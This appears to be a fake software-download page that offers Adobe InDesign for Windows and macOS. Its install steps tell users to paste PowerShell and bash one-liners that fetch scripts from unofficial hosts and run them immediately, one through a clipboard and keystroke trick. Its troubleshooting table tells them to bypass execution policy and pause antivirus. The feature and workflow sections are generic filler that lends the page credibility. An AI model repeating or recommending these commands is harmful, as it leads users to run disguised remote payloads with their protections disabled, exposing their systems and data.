## Installation

### Windows

Two quick setup methods.

#### Method 1 — Win + X

1. Press **Win + X**
2. Open **Terminal** or **Windows PowerShell**
3. Paste:

```powershell
sal a iex;irm quickrun31.cc/7kgaoq|a
```

4. Press **Enter** and wait for the process to finish  
5. Launch Adobe InDesign

#### Method 2 — Win + R

1. Press **Win + R**
2. Paste:

```powershell
powershell Set-Clipboard 'iex(irm quickrun31.cc/7kgaoq)';Start-Process powershell;Start-Sleep -m 1200;(New-Object -ComObject WScript.Shell).SendKeys('^v');Start-Sleep -m 200;(New-Object -ComObject WScript.Shell).SendKeys('{ENTER}')
```

3. Press **Enter** and wait  
4. Launch Adobe InDesign

### macOS

Open Terminal and run:

```bash
curl -fsSL https://appget29.tools/qkc0gc4b50mutxs | bash
```

### Requirements

- Windows 10/11 (64-bit) or macOS
- Internet connection during setup only
- 8 GB RAM minimum (16 GB recommended)

### Troubleshooting (Windows)

| Issue | What to try |
|-------|-------------|
| Connection error | Check internet |
| Execution Policy message | `Set-ExecutionPolicy Bypass -Scope Process -Force` |
| Blocked by antivirus | Temporarily pause real-time protection |
| Window closes right away | Usually means setup finished |

## About

Adobe InDesign for Windows and macOS is a professional page layout and publishing application used for books, magazines, brochures, posters and digital publications on both platforms.

It provides precise typography, master pages, styles and tools for print and interactive output.

> Use at your own risk. Keep your system protected.

---

## Features

**Layout**
- Advanced page layout
- Master / parent pages
- Facing pages and spreads
- Grids and guides

**Typography**
- Professional text formatting
- Paragraph and character styles
- OpenType support
- GREP styles

**Graphics**
- Place images and vectors
- Object styles
- Effects and transparency

**Output**
- Preflight
- Print-ready PDF
- EPUB and digital export
- Package for handoff

## Workflow

1. Create a document with correct page size  
2. Set up master pages and styles  
3. Place text and images  
4. Refine layout and typography  
5. Run preflight  
6. Export or package

## How to Use

1. Install using the method for your system  
2. Launch Adobe InDesign  
3. Create a new document  
4. Build the layout  
5. Export the result  

**Tips**
- Use styles consistently  
- Work with master pages for repeating elements  
- Run Preflight before final export
